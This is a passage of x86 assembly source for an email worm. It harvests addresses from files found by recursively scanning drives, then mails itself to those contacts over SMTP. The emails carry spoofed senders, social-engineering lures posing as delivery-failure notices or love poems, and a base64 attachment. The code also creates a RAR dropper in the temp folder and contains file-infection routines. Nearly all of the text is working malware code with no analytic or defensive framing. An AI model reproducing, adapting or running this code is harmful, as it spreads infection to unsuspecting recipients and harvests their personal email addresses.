	ja	x_msg9_
	lea	esi,[ebp + xmsg7]
	jmp	Pmsg_
x_msg9_:cmp	eax,0a000h
	ja	x_msg10
	lea	esi,[ebp + xmsg8]
	jmp	Pmsg_
x_msg10:cmp	eax,0b000h
	ja	x_msg11
	lea	esi,[ebp + xmsg9]
	jmp	Pmsg_
x_msg11:cmp	eax,0c000h
	ja	x_msg12
	lea	esi,[ebp + xmsg10]
	jmp	Pmsg_
x_msg12:lea	esi,[ebp + xmsg11]
Pmsg_:	push	esi					;message

	lea	eax,[ebp + boundry]
	push	eax					;boundary
		
	lea	eax,[ebp + boundry]
	push	eax					;boundary
			
	call	GenRandomNumber
	
	and	eax,7000h
	cmp	eax,1000h
	ja	x_sub1_
	lea	esi,[ebp + xsbj1]
	jmp	Psub_
x_sub1_:cmp	eax,2000h
	ja	x_sub2_
	lea	esi,[ebp + xsbj2]
	jmp	Psub_
x_sub2_:cmp	eax,3000h
	ja	x_sub3_
	lea	esi,[ebp + xsbj3]
	jmp	Psub_
x_sub3_:cmp	eax,4000h
	ja	x_sub4_
	lea	esi,[ebp + xsbj4]
	jmp	Psub_
x_sub4_:cmp	eax,5000h
	ja	x_sub5_
	lea	esi,[ebp + xsbj5]
	jmp	Psub_
x_sub5_:cmp	eax,6000h
	ja	x_sub6_
	lea	esi,[ebp + xsbj6]
	jmp	Psub_
x_sub6_:lea	esi,[ebp + xsbj7]
Psub_:	push	esi					;subject
	
	lea	eax,[ebp + MailAddr]
	push	eax					;mail to
	
	lea	eax,[ebp + faked_mfrm]
	push	eax					;mail from
	
	lea	eax,[ebp + MailHeader]
	push	eax					;formated string
	
	push	[ebp + MailBuffer]
	
	call	[ebp + wsprintf]			;create mime message
	
	add	esp,(13*4)				;restore stack
		
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]	

SndAtt:	push	0h
	push	[ebp + sizeofbase64out]
	push	[ebp + base64outputmem]
	push	[ebp + vsocket]
	call	[ebp + send]				;send attachment

	lea	eax,[ebp + boundry]
	push	eax	
	call	PushBN
	db	0dh,0ah,"--%s--",0dh,0ah,0dh,0ah,'.',0dh,0ah,0h	
PushBN:	push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;send end of DATA
	add	esp,(3*4)

	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]
	
	call	__recv	
		
ExitFm:	push	[ebp + MailBuffer]
	call	[ebp + GlobalFree]
QuitM:	push	0h
	push	SizeOfQuit
	call	O_QT
	SizeOfQuit	equ	(O_QT-$)
	db	db	"QUIT",0dh,0ah
O_QT:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
Disconnect:	
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
	ret


__recv:	push	0h
	push	SizeOfGB
	call	PushGB
	SizeOfGB	equ	(PushGB-$)
	GetBuffer	db	512d	dup(0)
PushGB:	push	dword ptr [ebp + vsocket]
	call	[ebp + recv]
	ret
	
	
MailType	db	0		;1=failed sending/0=love letter	
	
MailBuffer	dd	0

boundry		db	20h	dup(0)
		SizeOfBoundary	equ	($-boundry-1)	;keep null at the end

faked_mfrm	db	128d	dup(0)

rar_suffix	db	".rar",0h
exe_suffix	db	".exe",0h

;****************************[Mail Format]******************************************


MailHeader:

	db	"From:<%s>",0dh,0ah
	db	"To: %s",0dh,0ah
	db	"Subject:%s",0dh,0ah
	db	"MIME-Version: 1.0",0dh,0ah
	db	"Content-Type: multipart/mixed;",0dh,0ah
	db	' boundary="%s"',0dh,0ah
	db	"X-Priority: 3",0dh,0ah
	db	"X-MSMail-Priority: Normal",0dh,0ah
	db	"X-Mailer: Microsoft Outlook Express 6.00.2800.1106",0dh,0ah
	db	"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106",0dh,0ah
	db	0dh,0ah,"This is a multi-part message in MIME format.",0dh,0ah
	db	"--%s",0dh,0ah
	db	"Content-Type: text/plain;",0dh,0ah
	db	' charset="windows-1255"',0dh,0ah
	db	"Content-Transfer-Encoding: 7bit",0dh,0ah,0dh,0ah
	db	"%s",0dh,0ah
	db	"--%s",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "%s%s"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db      'Content-Disposition: attachment; filename="%s%s"',0dh,0ah,0dh,0ah,0h


;****************************[Mail type 1]******************************************

	
msg1	db	"The server could not fully receive an email message which someone",0ah,0dh
	db	"trying to send you. The incomplete message has been added as attachment.",0
		
msg2	db	"Error 569: Mail delivery failure. The email message has been added to the attachments.",0h

msg3	db	"Your message could not be delivered to its target. Please check the attachment for further info.",0h

msg4	db	"The message cannot be represented in 7-bit ASCII encoding and has been sent as a binary attachment.",0h

msg5	db	"The message contains Unicode characters and has been sent as a binary attachment.",0h

msg6	db	"Mail transaction failed. Partial message is available.",0h
	
	
frm1	db	"Staff",0h
frm2	db	"Admin",0h
frm3	db	"Management",0h
frm4	db	"Support",0h
frm5	db	"Administration",0h
frm6	db	"PostMaster",0h
frm7	db	"No.reply",0h

sub1	db	"Mail delivery failure",0
sub2	db	"Impartial mail message",0
sub3	db	"Error receiving mail",0

atch1	db	"partialmessage",0
atch2	db	"undelivered",0
atch3	db	"original",0
atch4	db	"restored_mail",0
atch5	db	"letter",0
atch6	db	"unrecived",0
atch7	db	"textfile1",0
		
;****************************[Mail type 2]******************************************

xsbj1	db	"Thee and me",0
xsbj2	db	"Yours forever",0
xsbj3	db	"My heart",0
xsbj4	db	"True feelings",0
xsbj5	db	"Me and you",0
xsbj6	db	"A kiss for a smile",0
xsbj7	db	"Valentine (a little late)",0
	
	
xmsg1	db	"A special world for you and me",0dh,0ah
	db	"A special bond one cannot see",0dh,0ah
	db	"It wraps us up in its cocoon",0dh,0ah
	db	"And holds us fiercely in its womb.",0h
	
xmsg2	db	"Its fingers spread like fine spun gold",0dh,0ah
	db	"Gently nestling us to the fold",0dh,0ah
	db	"Like silken thread it holds us fast",0dh,0ah
	db	"Bonds like this are meant to last.",0h
	
xmsg3	db	"And though at times a thread may break",0dh,0ah
	db	"A new one forms in its wake",0dh,0ah
	db	"To bind us closer and keep us strong",0dh,0ah
	db	"In a special world, where we belong.",0h
	
xmsg4	db	"My love, I have tried with all my being",0dh,0ah
	db	"to grasp a form comparable to thine own,",0dh,0ah
	db	"but nothing seems worthy;",0h
	
xmsg5	db	"I know now why Shakespeare could not",0dh,0ah
	db	"compare his love to a summer’s day.",0dh,0ah
	db	"It would be a crime to denounce the beauty",0dh,0ah
	db	"of such a creature as thee,",0dh,0ah
	db	"to simply cast away the precision",0dh,0ah
	db	"God had placed in forging you.",0h
	
xmsg6	db	"Each facet of your being",0dh,0ah
	db	"whether it physical or spiritual",0dh,0ah
	db	"is an ensnarement",0dh,0ah
	db	"from which there is no release.",0dh,0ah
	db	"But I do not wish release.",0dh,0ah
	db	"I wish to stay entrapped forever.",0dh,0ah
	db	"With you for all eternity.",0dh,0ah
	db	"Our hearts, always as one.",0h
	
xmsg7	db	"If I could have just one wish,",0dh,0ah
	db	"I would wish to wake up everyday",0dh,0ah
	db	"to the sound of your breath on my neck,",0dh,0ah
	db	"the warmth of your lips on my cheek,",0dh,0ah
	db	"the touch of your fingers on my skin,",0dh,0ah
	db	"and the feel of your heart beating with mine...",0dh,0ah
	db	"Knowing that I could never find that feeling",0dh,0ah
	db	"with anyone other than you.",0h
	
xmsg8	db	"I love the way you look at me,",0dh,0ah
	db	"Your eyes so bright and blue.",0dh,0ah
	db	"I love the way you kiss me,",0dh,0ah
	db	"Your lips so soft and smooth.",0h
	
xmsg9	db	"I love the way you make me so happy,",0dh,0ah
	db	"And the ways you show you care.",0dh,0ah
	db	"I love the way you say, I Love You,",0dh,0ah
	db	"And the way you're always there.",0h
	
xmsg10	db	"I love the way you touch me,",0dh,0ah
	db	"Always sending chills down my spine.",0dh,0ah
	db	"I love that you are with me,",0dh,0ah
	db	"And glad that you are mine.",0h
	
xmsg11	db	"I wrote your name in the sky,",0dh,0ah
	db	"but the wind blew it away.",0dh,0ah
	db	"I wrote your name in the sand,",0dh,0ah
	db	"but the waves washed it away.",0dh,0ah
	db	"I wrote your name in my heart,",0dh,0ah
	db	"and forever it will stay.",0h
	
	
xattch1	db	"The sky",0h
xattch2	db	"My wish",0h
xattch3	db	"My hope",0h
xattch4	db	"My desire",0h
xattch5	db	"My love",0h
xattch6	db	"Forever",0h
xattch7	db	"A smile",0h
xattch8	db	"My heart",0h
	
;*************************************************************************************

;word creation engine by BlueOwl
;-------------------------------
;		push nicklen
;		push ptr to output

makeword:	call	GenRandomNumber
makeword_in:	push	ecx edi ebx edx
		mov	edi, [esp+20]
		mov	ecx, [esp+24]
		xchg	eax, ebx
		push	3
		call	_nexthash3
		dec	edi
_loop:		inc	edi
		dec	eax
		jz	_gen1
		dec	eax
		jz	_gen2
_gen0:		push	5
		call	_nexthash7
		mov	al, byte  ptr[ebp + worddata + eax]
		mov	byte [edi], al
		push	2
		call	_nexthash3
		inc	eax
		cmp	ecx, 2
		jnz	_next
		mov	eax, 2
		jmp	_next
_gen1:		push	3
		call	_nexthash3
		mov	al, byte  ptr[ebp +worddata+5+eax]
		mov	byte [edi], al
		xor	eax, eax
		jmp	_next
_gen2:		push	4
		call	_nexthash7 
		mov	al, byte ptr  [ebp +worddata+8+eax]
		mov	byte [edi], al
		push	2
		call	_nexthash3
		cmp	ecx, 2
		jz	_next
		xor	eax, eax
_next:		dec	ecx
		jnz	_loop
		sub	edi, [esp+20]
		xchg	eax, edi
		pop	edx ebx edi ecx
		ret	8

_nexthash3:	mov	eax, ebx
		rol	ebx, 2
		and	eax, 3
		jmp	_mainnexthash
_nexthash7:	mov	eax, ebx
		rol	ebx, 3
		and	eax, 7
_mainnexthash:	xor	edx, edx
		div	dword ptr [esp+4]
		xchg	eax, edx
		ret	4
		
		worddata db "aeioulnrkdpc",0,0

	
CreateVirusRarFile:
	
	lea	edx,[ebp + FileToInfect]
	push	edx
	push	0ffh
	call	[ebp + GetTempPath]			;get the temp directory path
	or	eax,eax
	je	CRF_Fail
		
	lea	edi,[ebp + FileToInfect]
_SNB:	cmp	byte ptr [edi],0h
	je	_GTFN
	inc	edi
	jmp	_SNB					;seek till 0 byte found
	
_GTFN:	call	InitRandomNumber
	mov	ecx,6h
@__RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@__RandLetter				;gen random file name
	mov	byte ptr [edi],'.'
	inc	edi
	mov	ecx,3h
@x_RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@x_RandLetter				;gen random file suffix
		
	xor	eax,eax
	
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	eax
	push	eax
	push	GENERIC_WRITE
	lea	edx,[ebp + FileToInfect]
	push	edx
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	CRF_Fail
		
	push	eax					;push fh for CloseHandle...
	
	push	0h
	call	NWBx
	dd	0	
NWBx:	push	SizeOfRawFile
	lea	ebx,[ebp + RarFile]
	push	ebx
	push	eax
	call	[ebp + WriteFile]
	
	call	[ebp + CloseHandle]			;close file
	
	mov	[ebp + nFileSizeLow_],SizeOfRawFile
	
	call	InfectRar
	jnc	CRF_Fail
	
	stc
	ret
CRF_Fail:
	clc
	ret

	use_rar_file		db	0

RarFile:
	db 052h,061h,072h,021h,01ah,007h,000h,0cfh,090h,073h
	db 000h,000h,00dh,000h,000h,000h,000h,000h,000h,000h
	
	db 0,0,0,0,0,0,0				;dummy end of rar
	
	SizeOfRawFile	equ	($-RarFile)
	
	CREATE_ALWAYS	equ     2

ScanDrive:
	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	lea	eax,[ebp + SearchMask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE		;error ?
	je	@Stops_					;stop search
	
	mov	[ebp + hsearch],eax			;save search handle
	
@NxtF_:	mov	eax,[ebp + dwFileAttributes_]		;get file attributes
	and	eax,FILE_ATTRIBUTE_DIRECTORY		;remove bit masks
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;it is directory ?
	jne	_isFile
	cmp	byte ptr [ebp + cFileName_],'.'		;its start with . ?
	je	_FndNxt

	push	[ebp + hsearch]				;save search handle
	
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + SetCurrentDirectory]		;enter directory
	or	eax,eax
	je	_skpdir

	call	ScanDrive				;infect all sub directorys


	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]		;return to current directory
	

_skpdir:pop	[ebp + hsearch]				;restore search handle
	jmp	_FndNxt
	
	
	
_isFile:call	CheckFileSuffix
	jnc	_FndNxt
		
	push	1500d
	call	[ebp + Sleep]
	
	call	SearchMails
	

_FndNxt:lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	push	[ebp + hsearch]
	call	[ebp + FindNextFile]				;find next file
	or	eax,eax
	jne	@NxtF_

	push	[ebp + hsearch]
	call	[ebp +FindClose]			;end the search
	
@Stops_:ret



CheckFileSuffix:
	lea	eax,[ebp + cFileName_]
_Find0:	cmp	byte ptr [eax],0h
	je	_GetExt
	inc	eax
	jmp	_Find0
_GetExt:sub	eax,4h					;go before the .xxx	
	or	dword ptr [eax],20202020h		;convert to lower case
	cmp	dword ptr [eax],"txt."			;txt file ?
	je	GoodSuf
	cmp	dword ptr [eax],"mth."			;html file ?
	je	GoodSuf
	cmp	dword ptr [eax],"ftr."			;rtf file ?
	je	GoodSuf
	cmp	dword ptr [eax],"cod."			;doc file ?
	je	GoodSuf
	cmp	dword ptr [eax],"xdb."			;dbx file ?
	je	GoodSuf
	cmp	dword ptr [eax],"php."			;php file ?
	je	GoodSuf
	cmp	dword ptr [eax],"psj."			;jsp file ?
	je	GoodSuf	
	cmp	dword ptr [eax],"igc."			;cgi file ?
	je	GoodSuf		
	jmp	BadSuff
GoodSuf:stc
	ret
BadSuff:clc
	ret




SearchMails:
	xor	eax,eax
	push	eax
	push 	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	OutSM
	mov	[ebp + hfile],eax
	
	mov	[ebp + hmail],0h
	
@next_read:
	push	0
	lea	eax,[ebp + readed_bytes]
	push	eax
	push	200h
	lea	eax,[ebp + data_buffer]
	push	eax
	push	[ebp + hfile]
	call	[ebp + ReadFile]
	or	eax,eax				;success ?
	je	CloseF
@NextM:	
	cmp	[ebp + readed_bytes],0h
	je	CloseF
	
	mov	[ebp + _esp],esp
	lea	eax,[ebp + hmail]
	push	eax
	push	[ebp + readed_bytes]
	lea	eax,[ebp + data_buffer]
	push	eax
	call	find_next_email

	mov	esp,[ebp + _esp]
	
	or	eax,eax				;success ?
	je	@next_read
		
	push	eax
	lea	edi,[ebp + MailAddr]
	mov	al,0h
	mov	ecx,80h
	rep	stosb
	pop	eax
	

	mov	esi,eax				;eax = mail address in stack memory !!
	lea	edi,[ebp + MailAddr]		;so we have to copy the mail address 
NMCpy:	lodsb					;from stack from  stack memory into 
	or	al,al				;normal memory to  avoid fucking it 
	je	EndMCpy				;while using the stack.
	stosb
	jmp	NMCpy
EndMCpy:
	call	ConnectSMTP			;build smtp server from mail address & connect
	jnc	@NextM

	call	TransferWorm			;transfer the worm over mails

	jmp	@NextM
	
CloseF:	push	[ebp + hfile]
	call	[ebp + CloseHandle]
OutSM:	ret





ConnectSMTP:
	;build smtp server address and try to connect...
	lea	edi,[ebp + MailAddr]
NextMB:	cmp	byte ptr [edi],'@'
	je	BuildMS
	inc	edi
	jmp	NextMB
BuildMS:inc	edi					;edi=domain
	mov	[ebp + MD_Addr],edi
	mov	ecx,NumberOfMD
	lea	edi,[ebp + SmtpServerAdd]
	lea	esi,[ebp + mail_domains]
@NextMD:push	esi
	push	ecx
_NextMD:cmp	byte ptr [esi],0h
	je	CpyD
	lodsb
	stosb
	jmp	_NextMD
CpyD:	mov	byte ptr [edi],'.'
	inc	edi
	mov	esi,[ebp + MD_Addr]
NextMDb:cmp	byte ptr [esi],0h
	je	TryToC
	lodsb
	stosb
	jmp	NextMDb
	

TryToC:	
	mov	[ebp + ConnectionSuccess],0h
	

	call	overTI
	dd	0
overTI: xor	eax,eax	
	push	eax
	push	eax
	lea	ebx,[ebp + ConnectToServer]
	push	ebx
	push	eax
	push	eax
	
	call	[ebp + CreateThread]
	or	eax,eax
	je	SkipMD
	
	mov	[ebp + CTS_h],eax
	
	push	(15*1000)
	push	eax
	call	[ebp + WaitForSingleObject]
	
	push	[ebp + CTS_h]
	call	[ebp + CloseHandle]
	
	cmp	byte ptr [ebp + ConnectionSuccess],0h
	je	SkipMD
	
	pop	ecx
	jmp	SmtpOk
	
SkipMD:	mov	al,0h
	mov	ecx,0ffh
	lea	edi,[ebp + SmtpServerAdd]
	rep	stosb
	pop	ecx
	pop	esi
	cmp	ecx,0h
	je	CSMTP_Fail
	inc	esi
@__NMDb:cmp	byte ptr [esi],0h
	je	xNextMd
	inc	esi
	jmp	@__NMDb
xNextMd:inc	esi
	lea	edi,[ebp + SmtpServerAdd]
	
	dec	ecx
	cmp	ecx,0h
	je	CSMTP_Fail
	jmp	@NextMD
	
SmtpOk:	pop	esi
	stc
	ret
CSMTP_Fail:
	clc
	ret
	
	CTS_h		dd	0
	
	mail_domains 	db "smtp",0,"mail",0
			
	NumberOfMD	equ	2
			
	SmtpServerAdd	db	0ffh	dup(0)
	
	MailAddr	db	80h	dup(0)	
	
	MD_Addr		dd	0
	
	xCON_ID		dd	0
	
	ConnectionSuccess	db	0
	
ConnectToServer:
	call 	CTS_delta
CTS_delta:pop	ebp
	sub	ebp,offset CTS_delta
	push	IPPROTO_TCP
	push	SOCK_STREAM
	push	AF_INET
	call	[ebp + socket]		;create socket
	cmp	eax,SOCKET_ERR
	je	ConnectionErr
	mov	dword ptr [ebp + vsocket],eax
	push	25			;smtp
	call	[ebp + htons]
	mov	word ptr [ebp + sin_port],ax
	mov	word ptr [ebp + sin_family],AF_INET
	lea	eax,[ebp + SmtpServerAdd]
	push	eax
	call	[ebp + gethostbyname]
	cmp	eax,0h
	je	CloseSockErr
	mov	eax,dword ptr [eax + HOSTENT_IP]
	mov	eax,dword ptr [eax]
	mov	eax,dword ptr [eax]
	mov	dword ptr [ebp + sin_addr],eax
	push	SizeOfSOCKADDR
	lea	eax,[ebp + SOCKADDR]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + connect]
	cmp	eax,0h
	jne	EN_Cs
	mov	byte ptr [ebp + ConnectionSuccess],1h
	push	0AAAAAAAAh
	call	[ebp + ExitThread]
CloseSockErr:
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
ConnectionErr:
	mov	byte ptr [ebp + ConnectionSuccess],0h
	push	0DEADB33Fh
	call	[ebp + ExitThread]
	

GetWinsockApis:
	lea	eax,[ebp + WinsockDll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	GetWinsockApisErr
	mov	dword ptr [ebp + hWinsock],eax
	xchg	eax,edx
	mov	ecx,NumberOfWinsockFunctions
	lea	eax,[ebp + winsock_functions_sz]
	lea	ebx,[ebp + winsock_functions_addresses]
	call	GetNextAPI
	ret
GetWinsockApisErr:
	clc
	ret
	
	WinsockDll	db	"ws2_32.dll",0
	hWinsock	dd	0
	
	
	winsock_functions_sz:
	
	_WSAStartup	db	"WSAStartup",0
	_WSACleanup	db	"WSACleanup",0
	_socket		db	"socket",0
	_gethostbyname	db	"gethostbyname",0
	_connect	db	"connect",0
	_recv		db	"recv",0
	_send		db	"send",0
	_htons		db	"htons",0
	_closesocket	db	"closesocket",0
	
	winsock_functions_addresses:
	
	WSAStartup	dd	0
	WSACleanup	dd	0
	socket		dd	0
	gethostbyname	dd	0
	connect		dd	0
	recv		dd	0
	send		dd	0
	htons		dd	0
	closesocket	dd	0
	
	NumberOfWinsockFunctions	equ	9	
	
	VERSION1_1	equ	0101h
	AF_INET		equ	2      
	SOCK_STREAM	equ     1     
	SOCKET_ERR	equ	-1   
	HOSTENT_IP      equ	0ch
	IPPROTO_TCP	equ	6h	
	
	
	vsocket		dd	0
	
	
WSADATA:	
	mVersion	dw	0
	mHighVersion	dw	0
	szDescription	db	257 dup(0)
	szSystemStatus	db	129 dup(0)
	iMaxSockets	dw	0
	iMaxUpdDg	dw	0
	lpVendorInfo	dd	0	
	
	
SOCKADDR:
	sin_family	dw	0	
	sin_port	dw	0
	sin_addr        dd      0       
	sin_zero	db	8 dup(0)
	SizeOfSOCKADDR	equ	($-SOCKADDR)	




	_esp		dd	0
	hmail		dd	0
	readed_bytes	dd	0

	data_buffer	db	200h	dup(0)


;*************************************************
;MAIL RIPPER - Published in 29a#6 by annonymouse
;*************************************************

find_next_email:
; ----------------------------------------------
; CONFIG BLOCK
; ----------------------------------------------
__MAX_VALID_LEN equ     260
__MAX_EMAIL_EXT	equ	3
__MIN_EMAIL_EXT	equ	2  
; ----------------------------------------------
        pushad        
        
        call    __xx
__xx:   pop     ebp
        sub     ebp, offset __xx                
        xor     eax, eax
	sub	esp, __MAX_VALID_LEN
        sub     esp, 4*4
        
__last_pos      equ     dword ptr [esp+11*4+4*4+__MAX_VALID_LEN]
__len           equ     dword ptr [esp+10*4+4*4+__MAX_VALID_LEN]
__buf           equ     dword ptr [esp+09*4+4*4+__MAX_VALID_LEN]
__p2            equ     dword ptr [esp+04]
__p3            equ     dword ptr [esp+08]
__full_len      equ     dword ptr [esp+12]
__p1            equ     dword ptr [esp]
__ret_buf	equ	[esp+4*4]

__0:    mov     edx, __buf
        mov     esi, edx
        add     edx, __len
        mov     eax, __last_pos
        mov     eax, [eax]
        add     esi, eax
        cmp     esi, edx
        jae     __exit_none
                
        cld

__1:    lodsb
        cmp     esi, edx
        jae     __exit_none
        cmp     al, '@'         ; get to the middle
        jnz     __1  
                        
        dec     esi     
        mov     __p1, esi       ; middle address
                
        xor     ecx, ecx
        inc     esi

__2:    lodsb
        or      al, al          
        jz      __3     
        cmp     esi, edx
        jae     __3
        
        inc     ecx
                        
; check out for separators
        cmp     al, 2Dh		; '-'
        je      __2
        cmp     al, 2Eh		; '.'
        je      __2
        cmp     al, 30h
        jb      __x8
        cmp     al, 39h
        jbe     __2                             
        cmp     al, 41h
        jb      __x3
	cmp	al, 60h
	jbe	__a
	jmp	__x03
__a:    cmp     al, 5Bh
        jb      __2
        cmp	al, 5Ch
        jz	__xx3
        cmp     al, 5Eh
        jb      __3                     
        cmp     al, 60h                 
        je      __3

__x03:  cmp     al, 7Ah
        jbe     __2                     
        
__3:    cmp     ecx, 4                  ; min len
        jb      __x3            
        cmp     ecx, __MAX_VALID_LEN
        jb      __4

__x3:   mov     eax, __last_pos
        sub     esi, __buf
        mov     [eax], esi              ; save new srch position        
        jmp     __0

__xx3:	dec	esi

__4:	mov     __p2, esi               ; end pos
        xor     ecx, ecx
        
        std                                     
        mov     esi, __p1               ; scan backward from the middle 
        xor     ecx, ecx
        dec     esi
                
__5:    inc     ecx
        lodsb
        or      al, al
        jz      __8
        
        cmp     esi, __buf
        jbe     __6
                
; check out for separators
        cmp     al, 2Dh         ; -     
        je      __5
        cmp     al, 2Eh         ; .
        je      __5
        cmp     al, 30h
        jb      __8
        cmp     al, 39h
        jbe     __5                     
        cmp     al, 41h
        jb      __8             
        cmp     al, 5Bh
        jb      __5                     
        cmp     al, 5Eh
        jb      __8             
        cmp     al, 60h                 
        je      __8             
        cmp     al, 7Ah
        jbe     __5                                             
        
__6:    or      ecx, ecx
        jnz     __7     
        cmp     ecx, __MAX_VALID_LEN
        jb      __7
        
__ret:  mov     eax, __p2
        inc     eax
        sub     eax, __buf              ; calc offset
        mov     ebx, __last_pos
        mov     [ebx], eax      
        jmp     __0

__8:    inc     esi
        inc     esi
        dec     ecx
        jmp     __6
        
__x8:   dec     esi     
        jmp     __4
                
; p3 = start of the string      
__7:    mov     eax, esi
        mov     __p3, eax
        
; multidot check for 1st part
        mov     esi, __p1
        std
        dec     esi

__x5:   lodsb
        cmp     esi, __p3               ; start of buffer ?
        jbe     __x05
        cmp     al, '.'                 ; dot ?
        jnz     __x5                    
        cmp     byte ptr [esi], '.'     ; another dot near ?
        jz      __ret			; get da fuck out!

        cmp	word ptr [esi], '@.'
     	jz	__ret
        cmp	word ptr [esi], '.@'
        jz	__ret
	jmp     __x5
        
__x05:  mov     eax, __p2
        sub     eax, __p3
        mov     __full_len, eax
        
; syntax check. (alpha-begining,dot-start,dot-end fixup,short extension)
__d9:
        mov     esi, __p3
        cld

__9:    lodsb
        cmp	al, '.'
        jnz	__d10

	inc	__p3
        dec	__full_len
        jmp	__d9

__d10:  cmp     al, 41h                 ; 1a@e.com, .a@e.com are not valid addrs
        jb      __ret           
                                        
        mov     esi, __p2
        std
        dec     esi
        xor     ecx, ecx

; multidot check for 2nd part
__x9:   lodsb
        cmp     al, '@'                 ; already @ ?
        jz      __x09                   ; done testing
        cmp     al, '.'                 ; dot ?
        jnz     __x9                    
        cmp     byte ptr [esi], '.'     ; another dot near ?
        jz      __ret                   ; get da fuck out!
        cmp	word ptr [esi], '@.'
	jz	__ret
        cmp	word ptr [esi], '.@'
	jz	__ret
        jmp     __x9

__x09:  mov     esi, __p2
        dec     esi     

__x10:  lodsb                           ; pass all non-alpha chars
        cmp     al, 'A'
        jae     __10
        dec     __full_len
        jmp     __x10
                        
__10:   inc     ecx
        lodsb        
        cmp     esi, __buf              ; check overflow
        jz      __exit_none
        cmp     esi, __p3               ; prevent email-without-a-dot processing
        jbe     __ret
        
        cmp     al, '.'
        jz      __11
        cmp     al, '@'                 ; email with more than one '@' ?
        jz      __ret                   ; dont process
        jmp     __10
        
__11:   cmp     ecx, __MIN_EMAIL_EXT
        jb      __ret
        cmp     ecx, __MAX_EMAIL_EXT    ; dont let extension be more that 3 bytes
        ja      __ret
		
        mov     esi, __p3
        mov     ecx, __full_len
        call	__is_ascii		; final check
        or	eax, eax
        jz	__ret

        lea     edi, __ret_buf
        cld        
        rep     movsb                   ; copy entire email        
        xor     eax, eax
        stosd                           ; zero-terminated
        
__exit: mov     eax, __p2
        inc     eax
        mov     ebx, __last_pos
        sub     eax, __buf
        mov     [ebx], eax              ; for later use
        lea	eax, __ret_buf
        
__x12:  add     esp, 4*4+__MAX_VALID_LEN
        mov     [esp+7*4], eax
        
__12:   popad
        ret
        
__exit_none:
        xor     eax, eax
        jmp     __x12    

__is_ascii:
        pushfd
        push	esi
        push	ecx        
	cld
__isascii1:
        lodsb
        cmp	al, 2Dh
        jb	__is_ascii_f
        cmp	al, 7Ah
        ja	__is_ascii_f
        loop	__isascii1

        push	1
        pop	eax
        pop	ecx
        pop	esi
        popfd
        ret
__is_ascii_f:
	pop	ecx
        pop	esi
        popfd
	xor	eax, eax
        ret

;find_next_email endp

findemail_proc_size     = $-find_next_email

;**********************************************



	kernel32base	dd	0
	
IF	DEBUG
	
	DriveInfectionWarning	db	"Do You Wise To Infect This Drive?",0

ENDIF



		
GetADVAPI32Apis:
	lea	eax,[ebp + ADVAPI32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfRegFunctions
	lea	eax,[ebp + reg_functions_sz]
	lea	ebx,[ebp + reg_function_addresses]
	call	GetNextAPI
	ret

	ADVAPI32dll		db	"ADVAPI32.DLL",0
	
	reg_functions_sz:

	_RegOpenKeyExA		db	"RegOpenKeyExA",0
	_RegCloseKey		db	"RegCloseKey",0
	_RegSetValueEx		db	"RegSetValueExA",0

	reg_function_addresses:
	
	RegOpenKeyEx		dd	0
	RegCloseKey		dd	0
	RegSetValueEx		dd	0
	
	NumberOfRegFunctions	equ	3	
	
	

	KEY_READ		equ	00020019h
	ERROR_SUCCESS		equ	0h

GetUser32Apis:
	lea	eax,[ebp + User32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfUser32Functions
	lea	eax,[ebp + user32_functions_sz]
	lea	ebx,[ebp + user32_functions_addresses]
	call	GetNextAPI
	ret
	
	User32dll	db	"User32.dll",0
	
	user32_functions_sz:
	
	_MessageBox	db	"MessageBoxA",0
	_wsprintfA	db	"wsprintfA",0h
	
	user32_functions_addresses:
	
	MessageBox	dd	0
	wsprintf	dd	0
	
	NumberOfUser32Functions	equ	2
	
			
	MB_SYSTEMMODAL		equ	00001000h
	MB_ICONINFORMATION	equ	00000040h


StartDrive	db	"z:\",0

DRIVE_FIXED     equ	  3
DRIVE_REMOTE    equ	  4	
	
WIN32_FIND_DATA2:
	dwFileAttributes_	dd	0
	ftCreationTime_		dq	0
	ftLastAccessTime_	dq	0
	ftLastWriteTime_	dq	0
	nFileSizeHigh_		dd	0
	nFileSizeLow_		dd	0
	dwReserved0_		dd      0
	dwReserved1_		dd      0
	cFileName_		db      0ffh dup (0)
	cAlternateFileName_	db	20 dup (0)		;+ some bytes for padding
	
	
	
hsearch			dd	0	

	MB_YESNO	equ	00000004h
	IDYES	equ	6
	
IF	DEBUG
	warning	db	"Warning!!!:xworm is going to infect this file,press yes to infect",0
ENDIF	

;recursive directory scanner...		
InfectDrive:

	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	lea	eax,[ebp + SearchMask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE		;error ?
	je	@Stops					;stop search
	
	mov	[ebp + hsearch],eax			;save search handle
	
